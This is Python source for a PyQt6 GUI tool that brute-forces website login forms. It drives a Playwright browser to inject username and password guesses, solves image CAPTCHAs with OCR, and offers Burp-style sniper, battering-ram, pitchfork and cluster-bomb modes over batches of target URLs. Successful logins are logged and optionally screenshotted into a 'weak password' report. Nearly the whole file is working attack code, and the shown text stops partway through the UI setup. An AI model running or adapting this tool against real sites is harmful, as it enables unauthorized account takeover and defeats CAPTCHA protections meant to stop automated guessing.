import platform
import qasync
import sys
from PyQt6.QtWidgets import QMainWindow, QFileDialog, QApplication
from PyQt6.QtGui import QGuiApplication

import asyncio
from playwright.async_api import async_playwright
from lxml import etree
from ddddocr import DdddOcr
import base64
from pathlib import Path
from PyQt6 import QtCore, QtWidgets
import qdarktheme
from docx import Document
from docx.shared import Cm
from os import remove


class MLineEdit(QtWidgets.QLineEdit):
    def __init__(self, title, parent):
        super().__init__(title, parent)
        self.setAcceptDrops(True)

    def dragEnterEvent(self, e):
        if e.mimeData().hasText():
            e.accept()
        else:
            e.ignore()

    def dropEvent(self, e):
        filePathList = e.mimeData().text()
        filePath = filePathList.split('\n')[0]  # 拖拽多文件只取第一个地址
        if platform.system() == "Windows":
            filePath = filePath.replace('file:///', '')
        filePath = filePath.replace('file://', '', 1)  # 去除文件地址前缀的特定字符
        self.setText(filePath)


class Ui_window(object):
    def __init__(self):
        self.mode = int()
        self.url = ''
        self.urls = set()
        self.head = True
        self.jietu = False
        self.yzm_list = []
        self.ocr = DdddOcr(show_ad=False)
        self.tasks = []
        self.POSTdata = {
            'username': '',
            'password': ''
        }
        self.document = Document()
        self.document.add_heading("爆破程序执行截图", level=1)

    def save_jietu(self, target, name, password, tp):
        self.document.add_heading(f'目标地址:{target}', level=2)
        self.document.add_paragraph(f"用户名：{name} 密码：{password}")
        self.document.add_picture(f'{tp}', width=Cm(14), height=Cm(10))

    # 浏览器执行js代码区域
    async def performJs_yzm_code(self, page_two, passwd, user, code):
        return await page_two.evaluate('''()=>{
                                                   var urls = [];
                                                   var checkbox_list=[];
                                                   let user='';
                                                   let password='';
                                                   let u;
                                                   let c;
                                                   let form = document.getElementsByTagName('input');
                                                   for (let i = 0; i < form.length; i++) {
                                                       if (form[i].type == 'password') {
                                                           form[i].value = '%s'
                                                            password=form[i].value
                                                            form[i].dispatchEvent(new CustomEvent('input'))
                                                            u = i - 1
                                                            form[u].value = '%s'
                                                            form[u].dispatchEvent(new CustomEvent('input'))
                                                            username=form[u].value
                                                           c = i+1
                                                           form[c].value = '%s'
                                                            form[c].dispatchEvent(new CustomEvent('input'))

                                                       }
                                                       if (form[i].type == 'checkbox' && form[i].checked==false){
                                                        form[i].click()
                                        }
                                                       if (form[i].type == 'submit') {
                                                                   urls.push(user,password)
                                                           form[i].click()
                                                       }
                                                       if (form[i].type=='image'){
                                                           urls.push(user,password)
                                                           form[i].click()
                                                       }
                                                        if (form[i].type=='button'){
                                                           urls.push(user,password)
                                                           form[i].click()
                                                       }

                                                   }


                                                   return urls;
                                                                       }''' % (passwd, user, code))

    async def performjs_code(self, page_two, yzm):
        return await page_two.evaluate('''()=>{
                                var arrImg = document.images;
                                for (let i = 0; i < arrImg.length; i++){
                                if (arrImg[i].src.includes('%s')) {
                                    var canvas = document.createElement("canvas");
                                    canvas.width = arrImg[i].width;
                                    canvas.height = arrImg[i].height;
                                    var ctx = canvas.getContext("2d");
                                    ctx.drawImage(arrImg[i], 0, 0, arrImg[i].width, arrImg[i].height);
                                    var ext = arrImg[i].src.substring(arrImg[i].src.lastIndexOf(".") + 1).toLowerCase();
                                    var dataURL = canvas.toDataURL("image/" + ext)
                                 }
                                }
                                return dataURL
                                }
                                '''
                                       % yzm)

    async def performJs(self, page_two, passwd, user):
        return await page_two.evaluate('''()=>{
                                   var urls = [];
                                   var checkbox_list = [];
                                   let user='';
                                   let password='';
                                   let u;
                                   let form = document.getElementsByTagName('input');
                                   for (let i = 0; i < form.length; i++) {
                                       if (form[i].type == 'password') {
                                           form[i].value = '%s'
                                           password=form[i].value
                                           form[i].dispatchEvent(new CustomEvent('input'))
                                           u = i - 1
                                           form[u].value = '%s'
                                           form[u].dispatchEvent(new CustomEvent('input'))

                                           username=form[u].value
                                       }
                                       if (form[i].type == 'checkbox'){
                                            checkbox_list.push(form[i])
                                       }
                                       if (form[i].type == 'submit') {
                                                   urls.push(user,password)
                                           form[i].dispatchEvent(new CustomEvent('input'))

                                           form[i].click()
                                       }
                                       if (form[i].type=='image'){
                                           form[i].dispatchEvent(new CustomEvent('input'))

                                           urls.push(user,password)
                                           form[i].click()
                                       }
                                        if (form[i].type=='button'){
                                       form[i].dispatchEvent(new CustomEvent('input'))
                                           urls.push(user,password)
                                           form[i].click()
                                       }
                                   }
                                   for (let e = 0; e < checkbox_list.length; e++) {
                                            checkbox_list[e].click()

                                   }

                                   return urls;
                                                       }''' % (passwd, user))

    async def jsRequest(self, page_two, namepath, passpath, user, passwd, loginpath):
        return await page_two.evaluate('''()=>{

                            function x(xpath) {
      var result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      return result.iterateNext()
    };

                var name = x('%s');
                var password = x('%s');
                name.value =  '%s';
                password.value= '%s';
                var but = x('%s');
                but.click();
                                                                                }''' % (
            namepath, passpath, user, passwd, loginpath))

    async def jsRequest_code(self, page_two, namepath, passpath, codepath, user, passwd, code, loginpath):
        return await page_two.evaluate('''()=>{

                                function x(xpath) {
          var result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
          return result.iterateNext()
        }

                    var name = x('%s');
                    var password = x('%s');
                    var yzm = x('%s');
                    name.value= '%s'
                    password.value =  '%s'
                    yzm.value =  '%s'
                    var but = x('%s')
                    but.click()
                                                                                    }''' % (
            namepath, passpath, codepath, user, passwd, code, loginpath))

    # 判断url是否爆破成功
    async def urls_is_os(self, urls, page_two, setlist, user, passwd):
        if len(urls) != 0:
            result = f'title:{await page_two.title()} {page_two.url}  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}'
            self.result_text.append(str(' {}'.format(result)))
            if self.jietu:
                name = user + passwd + '.png'
                await  page_two.screenshot(path=f'{name}', )
                self.save_jietu(setlist[0], user, passwd, name)
                remove(name)

            if self.zd_yzm_text.text() in str(await page_two.content()) or self.sd_yzm_text.text() in str(
                    await page_two.content()):
                if self.yzm_list.count(
                        (self.url, self.POSTdata.get("username"), self.POSTdata.get("password"))) < 3:
                    self.urls.add((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
                    self.yzm_list.append((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
                    self.zd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")
                    self.sd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")
                    timeouts = int(self.zd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
            else:

                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two.wait_for_timeout(timeouts)
                await page_two.close()
                self.urls.discard(setlist)
                self.zd_start_log.append("请求队列还剩{}".format(len(self.urls)))
        else:
            try:
                await page_two.click('//button[@type="submit"] | //button[@type="button"] |//button', timeout=3000)
                result = f'title:{await page_two.title()} {page_two.url}  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}'
                self.result_text.append(str('{}'.format(result)))
                if self.jietu:
                    name = user + passwd + '.png'
                    await  page_two.screenshot(path=f'{name}', )
                    self.save_jietu(setlist[0], user, passwd, name)
                    remove(name)

                if self.zd_yzm_text.text() in str(await page_two.content()) or self.sd_yzm_text.text() in str(
                        await page_two.content()):
                    if self.yzm_list.count(
                            (self.url, self.POSTdata.get("username"), self.POSTdata.get("password"))) < 3:
                        self.urls.add((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
                        self.yzm_list.append((self.url, self.POSTdata.get("username"), self.POSTdata.get("password")))
                        self.zd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")
                        self.sd_start_log.append(f"验证码错误 重新爆破{self.POSTdata} 当前列表还剩{len(self.urls)}")
                        timeouts = int(self.zd_delay_text.text()) * 1000
                        await page_two.wait_for_timeout(timeouts)
                        await page_two.close()

                else:
                    timeouts = int(self.zd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
                    self.urls.discard(setlist)
                    self.zd_start_log.append("请求队列还剩{}".format(len(self.urls)))
            except  Exception as e:
                await page_two.close()
                self.urls.discard(setlist)
                self.zd_start_log.append("请求队列还剩{}".format(len(self.urls)))

    async def get_url_request(self, context, sem, setlist):
        url = setlist[0]
        self.url = url
        user = setlist[1]
        passwd = setlist[2]
        async with sem:
            page_two = await context.new_page()
            page_two.set_default_timeout(3000 * int(self.zd_delay_text.text()))
            try:
                await  page_two.goto(url)
                await page_two.wait_for_load_state(state='networkidle')
                html = etree.HTML(await  page_two.content())
                # 判断网站是否存在英文数字验证码图片地址
                img_code_url = html.xpath('//img/@src')
                yzm = [u for u in img_code_url if
                       not u.strip().endswith(('.png', '.gif', '.jpg', '.jpeg', '.ico', '.svg', '==')) and len(u) > 1]
                if len(img_code_url) == 0 or len(yzm) == 0:
                    urls = await self.performJs(page_two, passwd, user)
                    await page_two.wait_for_timeout(1000)
                    await self.urls_is_os(urls, page_two, setlist, user, passwd)
                else:
                    yzm = yzm[0].replace('..', '')
                    img_url = await self.performjs_code(page_two, yzm)
                    data = img_url.split(",")[1]
                    code = self.ocr.classification(base64.b64decode(data))
                    urls = await self.performJs_yzm_code(page_two, passwd, user, code)
                    await page_two.wait_for_timeout(1000)
                    self.POSTdata['username'] = user
                    self.POSTdata['password'] = passwd
                    await self.urls_is_os(urls, page_two, setlist, user, passwd)
            except  Exception as e:
                print("函数执行异常", e)
                self.urls.discard(setlist)
                self.zd_start_log.append("队列还剩{}".format(len(self.urls)))
                self.sd_start_log.append('请求失败{}'.format(setlist))
                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two.wait_for_timeout(timeouts)
                await page_two.close()

    async def get_url_request_sd(self, context, sem, setlist):
        url = setlist[0]
        self.url = url
        user = setlist[1]
        passwd = setlist[2]
        namepath = self.sd_user_text.text()
        passpath = self.sd_pass_text.text()
        loginpath = self.sd_login_text.text()
        yzmpath = self.sd_yzmpath_text.text()

        async with sem:
            page_two = await context.new_page()
            page_two.set_default_timeout(3000 * int(self.sd_delay_text.text()))
            try:
                page_two.on('response', self.on_response)
                await  page_two.goto(url)
                await page_two.wait_for_load_state(state='networkidle')
                html = etree.HTML(await  page_two.content())
                # 判断网站是否存在英文数字验证码图片地址
                img_code_url = html.xpath('//img/@src')
                yzm = [u for u in img_code_url if
                       not u.strip().endswith(('.png', '.gif', '.jpg', '.jpeg', '.ico', '.svg', '==')) and len(u) > 1]
                if len(img_code_url) == 0 or len(yzm) == 0:
                    await self.jsRequest(page_two, namepath, passpath, user, passwd, loginpath)
                    await page_two.wait_for_timeout(1000)
                    result = f'title:{await page_two.title()} {page_two.url}  长度:{len(await page_two.content())} 账户:{user} 密码 {passwd}'
                    self.result_text.append(str(' {}'.format(result)))
                    self.urls.discard(setlist)
                    self.sd_start_log.append("请求队列还剩{}".format(len(self.urls)))
                    timeouts = int(self.sd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
                else:
                    yzm = yzm[0].replace('..', '')
                    img_url = await self.performjs_code(page_two, yzm)
                    data = img_url.split(",")[1]
                    code = self.ocr.classification(base64.b64decode(data))
                    await self.jsRequest_code(page_two, namepath, passpath, yzmpath, user, passwd, code, loginpath)
                    await page_two.wait_for_timeout(1000)
                    self.POSTdata['username'] = user
                    self.POSTdata['password'] = passwd
                    timeouts = int(self.sd_delay_text.text()) * 1000
                    await page_two.wait_for_timeout(timeouts)
                    await page_two.close()
            except  Exception as e:
                print(e)
                self.urls.discard(setlist)
                self.sd_start_log.append('{}请求失败'.format(setlist))
                self.sd_start_log.append("队列剩余{}".format(len(self.urls)))
                timeouts = int(self.zd_delay_text.text()) * 1000
                await page_two.wait_for_timeout(timeouts)
                await page_two.close()

    async def alltasks(self):
        all = asyncio.all_tasks()
        self.zd_start_log.append(str(len(all)))

    async def main(self):
        async with async_playwright() as asp:
            PROXY_HTTP = f"http://{self.zd_proxy_text.text()}"
            browserLaunchOptionDict = {
                "headless": self.head,

            }
            ## 配置user-agent
            browse = await  asp.chromium.launch(**browserLaunchOptionDict)
            user_agent = "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 5.1; Trident/4.0; GTB7.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"
            context = await browse.new_context(ignore_https_errors=True, user_agent=user_agent)
            sem = asyncio.Semaphore(int(self.zd_sem_text.text()))
            while len(self.urls) > 0:
                try:
                    for url in self.urls.copy():
                        task = asyncio.create_task(self.get_url_request(context, sem, url))
                        task.set_name(url)
                        self.tasks.append(task)
                    dones, pendings = await asyncio.wait(self.tasks)
                except  Exception as e:
                    print(e)
            self.zd_start_log.append("爆破程序执行完毕")
            if self.jietu:
                self.document.save("弱口令报告.docx")
                self.zd_start_log.append("生成弱口令报告.docx到当前文件夹")

    async def main_sd(self):
        async with async_playwright() as asp:
            browse = await  asp.chromium.launch(headless=self.head)
            context = await browse.new_context(ignore_https_errors=True)
            sem = asyncio.Semaphore(int(self.sd_sem_text.text()))
            while len(self.urls) > 0:
                try:
                    tasks = [asyncio.ensure_future(self.get_url_request_sd(context, sem, url)) for url in
                             self.urls.copy()]
                    dones, pendings = await asyncio.wait(tasks)
                except  Exception as e:
                    print(e)
            self.sd_start_log.append("爆破程序执行完毕")

    # 这里读取批量文件
    def readfile_scan(self, name):
        try:
            from pathlib import Path
            wordlist = set(Path(name).read_text().splitlines())
            htmls = [
                url.strip() if url.strip().startswith(('http://', 'https://')) else ''.join(('http://', url.strip()))
                for
                url in wordlist if len(url) > 1]
            return htmls
        except Exception as e:
            print(e)

    def blastingMode(self, mode: str):
        url = self.target_url.text()
        user = self.password_result_text_user.toPlainText().split('\n')
        password = self.password_result_text_pass.toPlainText().split('\n')
        if url.endswith(".txt"):
            data = self.readfile_scan(url)
            for urls in data:
                if mode == 'sniper:狙击手':
                    if len(user) == 1 and len(password) >= 2:
                        for passwo in password:
                            self.urls.add((urls, user[0], passwo))
                    elif len(password) == 1 and len(user) >= 2:
                        for ur in user:
                            self.urls.add((urls, ur, password[0]))
                    elif len(password) >= 2 and len(user) >= 2:
                        self.zd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                        self.sd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                elif mode == "jietu:截图":
                    self.jietu = True
                    if len(user) == 1 and len(password) >= 2:
                        for passwo in password:
                            self.urls.add((urls, user[0], passwo))
                    elif len(password) == 1 and len(user) >= 2:
                        for ur in user:
                            self.urls.add((urls, ur, password[0]))
                    elif len(password) >= 2 and len(user) >= 2:
                        self.zd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                        self.sd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                elif mode == "ram:攻城锤":
                    if len(user) == 1 and len(password) == 1:
                        self.zd_start_log.append('你还没有输入用户名或密码哦')
                        self.sd_start_log.append('你还没有输入用户名或密码哦')
                        return
                    else:
                        payload = set(user + password)
                        for pay in payload:
                            self.urls.add((url, pay, pay))
                elif mode == "fork:草叉模式":
                    if len(user) <= 1 and len(password) <= 1:
                        self.zd_start_log.append('你还没有输入用户名或密码哦')
                        self.sd_start_log.append('你还没有输入用户名或密码哦')
                        return
                    else:
                        for name, pay in zip(user, password):
                            self.urls.add((url, name, pay))
                elif mode == "bomb:集束炸弹":
                    if len(user) <= 1 and len(password) <= 1:
                        self.zd_start_log.append('你还没有输入用户名或密码哦')
                        self.sd_start_log.append('你还没有输入用户名或密码哦')
                        return
                    elif len(user) <= 1 or len(password) <= 1:
                        self.zd_start_log.append('你还没有输入用户名或密码哦')
                        self.sd_start_log.append('你还没有输入用户名或密码哦')
                    else:
                        for name in user:
                            for pay in password:
                                self.urls.add((url, name, pay))
                else:
                    self.zd_start_log.append("暂时没有其他模式")
                    self.sd_start_log.append("暂时没有其他模式")
        else:
            if mode == 'sniper:狙击手':
                if len(user) == 1 and len(password) >= 2:
                    '''这里用户名 1位 密码 大于1 '''
                    for passwo in password:
                        self.urls.add((url, user[0], passwo))
                elif len(password) == 1 and len(user) >= 2:
                    '''这里用户名 大于1位 密码 ==1 '''
                    for ur in user:
                        self.urls.add((url, ur, password[0]))
                elif len(password) >= 2 and len(user) >= 2:
                    self.zd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                    self.sd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
            elif mode == "ram:攻城锤":
                if len(user) == 1 and len(password) == 1:
                    self.zd_start_log.append('你还没有输入用户名或密码哦')
                    self.sd_start_log.append('你还没有输入用户名或密码哦')
                    return
                else:
                    payload = set(user + password)
                    for pay in payload:
                        self.urls.add((url, pay, pay))
            elif mode == "fork:草叉模式":
                if len(user) <= 1 and len(password) <= 1:
                    self.zd_start_log.append('你还没有输入用户名或密码哦')
                    self.sd_start_log.append('你还没有输入用户名或密码哦')
                    return
                else:
                    for name, pay in zip(user, password):
                        self.urls.add((url, name, pay))
            elif mode == "bomb:集束炸弹":
                if len(user) <= 1 and len(password) <= 1:
                    self.zd_start_log.append('你还没有输入用户名或密码哦')
                    self.sd_start_log.append('你还没有输入用户名或密码哦')
                    return
                elif len(user) <= 1 or len(password) <= 1:
                    self.zd_start_log.append('你还没有输入用户名或密码哦')
                    self.sd_start_log.append('你还没有输入用户名或密码哦')
                else:
                    for name in user:
                        for pay in password:
                            self.urls.add((url, name, pay))
            elif mode == "jietu:截图":
                self.jietu = True
                if len(user) == 1 and len(password) >= 2:
                    '''这里用户名 1位 密码 大于1 '''
                    for passwo in password:
                        self.urls.add((url, user[0], passwo))
                elif len(password) == 1 and len(user) >= 2:
                    '''这里用户名 大于1位 密码 ==1 '''
                    for ur in user:
                        self.urls.add((url, ur, password[0]))
                elif len(password) >= 2 and len(user) >= 2:
                    self.zd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')
                    self.sd_start_log.append('当前模式 用户名设置固定值 密码 设置多个值 或者相反')

    # 暂停，重启按钮
    def waitingFor(self):
        self.log_clear()
        taskss = asyncio.all_tasks()
        for key in taskss:
            if "Task" not in key.get_name():
                self.urls.add(tuple(eval(key.get_name())))
                key.cancel()
            else:
                key.cancel()
        self.zd_start_log.append(f"暂停任务剩余{len(self.urls)}")
        self.sd_start_log.append(f"暂停任务剩余{len(self.urls)}")

    # 导出result 日志
    def export_log(self):
        try:
            with open('result.txt', 'a') as f:
                result = self.result_text.toPlainText().split("\n")
                for log in result:
                    f.write(log + "\n")
                self.zd_start_log.append("导出成功 保存内容到result.txt 文件夹")
                self.sd_start_log.append("导出成功 保存内容到result.txt 文件夹")
        except Exception as e:
            pass

    ##按钮区域
    def Clear_button_user(self):
        self.password_result_text_user.clear()

    def Clear_button_pass(self):
        self.password_result_text_pass.clear()

    def Add_button(self):
        if self.add_text_add_user.text():
            self.password_result_text_user.append(self.add_text_add_user.text())
            self.add_text_add_user.clear()
        elif self.add_text_add_pass.text():
            self.password_result_text_pass.append(self.add_text_add_pass.text())
            self.add_text_add_pass.clear()

    def Paste_button_user(self):
        ##创建剪切板对象
        clipboard = QApplication.clipboard()
        # 获取剪切板内容
        text = clipboard.text()
        self.password_result_text_user.append(text)

    def Paste_button_pass(self):
        ##创建剪切板对象
        clipboard = QApplication.clipboard()
        # 获取剪切板内容
        text = clipboard.text()
        self.password_result_text_pass.append(text)

    def Load_button_user(self):
        open_file_name = QFileDialog.getOpenFileName()
        if open_file_name[0].endswith(".txt"):
            text = Path(open_file_name[0]).read_text()
            self.password_result_text_user.append(text)

    def Load_button_pass(self):
        open_file_name = QFileDialog.getOpenFileName()
        if open_file_name[0].endswith(".txt"):
            text = Path(open_file_name[0]).read_text()
            self.password_result_text_pass.append(text)

    def get_head(self):
        if self.sd_browser_button.text() == 'False' or self.zd_browser_button.text() == "False":
            self.sd_browser_button.setText('True')
            self.zd_browser_button.setText("True")
            self.head = False
        elif self.sd_browser_button.text() == 'True' or self.zd_browser_button.text() == "True":
            self.head = True
            self.sd_browser_button.setText('False')
            self.zd_browser_button.setText("False")

    def log_clear(self):
        self.zd_start_log.clear()
        self.result_text.clear()
        self.sd_start_log.clear()
        self.urls.clear()
        self.tasks.clear()

    def get_start(self):
        self.log_clear()
        if self.tabWidget_mode.currentIndex() == 0:
            try:
                mode = self.zd_mode_list.currentText()
                self.blastingMode(mode)
                self.zd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main(), loop=loop)
            except  Exception as e:
                self.zd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 1:
            mode = self.sd_mode_list.currentText()
            self.blastingMode(mode)
            self.sd_start_log.append("手动请求模式启动！")
            try:
                self.sd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main_sd(), loop=loop)
            except  Exception as e:
                self.sd_start_log.append(str(e))

    def reget_start(self):
        if self.tabWidget_mode.currentIndex() == 0:
            try:
                self.zd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main(), loop=loop)
            except  Exception as e:
                self.zd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 1:
            self.sd_start_log.append("手动请求模式启动！")
            try:
                self.sd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                asyncio.ensure_future(self.main_sd(), loop=loop)
            except  Exception as e:
                self.sd_start_log.append(str(e))

    def setui_text(self, window):
        self.setupUi(window)

        # 暂停，重启按钮
        self.restart_button.clicked.connect(lambda: self.reget_start())
        self.suspended_button.clicked.connect(lambda: self.waitingFor())

        # 导出按钮
        self.export_button.clicked.connect(lambda: self.export_log())
        ##button 按钮
        self.zd_browser_button.clicked.connect(lambda: self.get_head())
        self.sd_browser_button.clicked.connect(lambda: self.get_head())
        ##用户名 设置

        self.Paste_text_button_user.clicked.connect(lambda: self.Paste_button_user())
        self.add_text_button_user.clicked.connect(lambda: self.Add_button())
        self.Clear_list_button_user.clicked.connect(lambda: self.Clear_button_user())
        self.Load_file_button_user.clicked.connect(lambda: self.Load_button_user())
        ##密码设置
        self.Paste_text_button_pass.clicked.connect(lambda: self.Paste_button_pass())
        self.add_text_button_pass.clicked.connect(lambda: self.Add_button())
        self.Clear_list_button_pass.clicked.connect(lambda: self.Clear_button_pass())
        self.Load_file_button_pass.clicked.connect(lambda: self.Load_button_pass())

        ##启动按钮
        self.start_button.clicked.connect(lambda: self.get_start())

    def setupUi(self, window):
        window.setObjectName("window")
        window.setFixedSize(1234, 886)
        screen = QGuiApplication.primaryScreen().size()
        size = window.geometry()
        window.move(int((screen.width() - size.width()) / 2),
                    int((screen.height() - size.height()) / 2))

        self.target_url = MLineEdit("", window)
        self.target_url.setGeometry(QtCore.QRect(10, 5, 561, 31))
        self.target_url.setCursorPosition(26)
        self.target_url.setObjectName("target_url")
        self.tabWidget_mode = QtWidgets.QTabWidget(window)
        self.tabWidget_mode.setGeometry(QtCore.QRect(0, 50, 681, 431))
        self.tabWidget_mode.setObjectName("tabWidget_mode")
        self.BLASt_zd = QtWidgets.QWidget()
        self.BLASt_zd.setObjectName("BLASt_zd")
        self.zd_mode_list = QtWidgets.QComboBox(self.BLASt_zd)
        self.zd_mode_list.setGeometry(QtCore.QRect(120, 20, 140, 20))
        self.zd_mode_list.setObjectName("zd_mode_list")
        self.zd_lable_mode = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_lable_mode.setGeometry(QtCore.QRect(10, 20, 90, 20))
        self.zd_lable_mode.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_lable_mode.setObjectName("zd_lable_mode")
        self.zd_browser_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_browser_label.setGeometry(QtCore.QRect(10, 60, 90, 20))
        self.zd_browser_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_browser_label.setObjectName("zd_browser_label")
        self.zd_delay_lable = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_delay_lable.setGeometry(QtCore.QRect(10, 180, 90, 20))
        self.zd_delay_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_delay_lable.setObjectName("zd_delay_lable")
        self.zd_delay_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_delay_text.setGeometry(QtCore.QRect(120, 180, 140, 20))
        self.zd_delay_text.setToolTipDuration(0)
        self.zd_delay_text.setObjectName("zd_delay_text")
        self.zd_start_run_loglabel = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_start_run_loglabel.setGeometry(QtCore.QRect(10, 250, 161, 41))
        self.zd_start_run_loglabel.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_start_run_loglabel.setObjectName("zd_start_run_loglabel")
        self.zd_start_log = QtWidgets.QTextBrowser(self.BLASt_zd)
        self.zd_start_log.setGeometry(QtCore.QRect(10, 290, 401, 101))
        self.zd_start_log.setObjectName("zd_start_log")
        self.zd_browser_button = QtWidgets.QRadioButton(self.BLASt_zd)
        self.zd_browser_button.setGeometry(QtCore.QRect(120, 60, 140, 20))
        self.zd_browser_button.setObjectName("zd_browser_button")
        self.zd_yzm_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_yzm_text.setGeometry(QtCore.QRect(280, 60, 160, 80))
        self.zd_yzm_text.setAlignment(
            QtCore.Qt.AlignmentFlag.AlignLeading | QtCore.Qt.AlignmentFlag.AlignLeft | QtCore.Qt.AlignmentFlag.AlignTop)
        self.zd_yzm_text.setObjectName("zd_yzm_text")
        self.zd_yzm_lable = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_yzm_lable.setGeometry(QtCore.QRect(280, 20, 160, 20))
        self.zd_yzm_lable.setObjectName("zd_yzm_lable")
        self.zd_proxy_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_proxy_label.setGeometry(QtCore.QRect(10, 100, 90, 20))
        self.zd_proxy_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_proxy_label.setObjectName("zd_proxy_label")
        self.zd_sem_label = QtWidgets.QLabel(self.BLASt_zd)
        self.zd_sem_label.setGeometry(QtCore.QRect(10, 140, 90, 20))
        self.zd_sem_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.zd_sem_label.setObjectName("zd_sem_label")
        self.zd_proxy_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_proxy_text.setGeometry(QtCore.QRect(120, 100, 140, 20))

        self.zd_proxy_text.setObjectName("zd_proxy_text")
        self.zd_sem_text = QtWidgets.QLineEdit(self.BLASt_zd)
        self.zd_sem_text.setGeometry(QtCore.QRect(120, 140, 140, 20))

        self.zd_sem_text.setObjectName("zd_sem_text")
        self.tabWidget_mode.addTab(self.BLASt_zd, "")
        self.BLAST_sd = QtWidgets.QWidget()
        self.BLAST_sd.setObjectName("BLAST_sd")
        self.sd_start_log = QtWidgets.QTextBrowser(self.BLAST_sd)
        self.sd_start_log.setGeometry(QtCore.QRect(10, 290, 401, 101))
        self.sd_start_log.setObjectName("sd_start_log")
        self.sd_yzm_lab = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_yzm_lab.setGeometry(QtCore.QRect(440, 270, 160, 20))
        self.sd_yzm_lab.setObjectName("sd_yzm_lab")
        self.sd_yzm_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_yzm_text.setGeometry(QtCore.QRect(440, 300, 160, 80))

        self.sd_yzm_text.setObjectName("sd_yzm_text")
        self.sd_mode_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_mode_lable.setGeometry(QtCore.QRect(280, 20, 90, 20))
        self.sd_mode_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_mode_lable.setObjectName("sd_mode_lable")
        self.sd_mode_list = QtWidgets.QComboBox(self.BLAST_sd)
        self.sd_mode_list.setGeometry(QtCore.QRect(390, 20, 140, 20))
        self.sd_mode_list.setObjectName("sd_mode_list")
        self.sd_mode_list.addItem("")
        self.sd_user_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_user_text.setGeometry(QtCore.QRect(120, 100, 140, 20))

        self.sd_user_text.setObjectName("sd_user_text")
        self.sd_yzm_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_yzm_lable.setGeometry(QtCore.QRect(11, 180, 90, 20))
        self.sd_yzm_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_yzm_lable.setObjectName("sd_yzm_lable")
        self.sd_pass_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_pass_text.setGeometry(QtCore.QRect(120, 140, 140, 20))

        self.sd_pass_text.setObjectName("sd_pass_text")
        self.sd_login_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_login_lable.setGeometry(QtCore.QRect(11, 220, 90, 20))
        self.sd_login_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_login_lable.setObjectName("sd_login_lable")
        self.sd_yzmpath_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_yzmpath_text.setGeometry(QtCore.QRect(120, 180, 140, 20))

        self.sd_yzmpath_text.setObjectName("sd_yzmpath_text")
        self.sd_browser_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_browser_lable.setGeometry(QtCore.QRect(10, 20, 90, 20))
        self.sd_browser_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_browser_lable.setObjectName("sd_browser_lable")
        self.sd_browser_button = QtWidgets.QRadioButton(self.BLAST_sd)
        self.sd_browser_button.setGeometry(QtCore.QRect(120, 20, 140, 20))
        self.sd_browser_button.setObjectName("sd_browser_button")
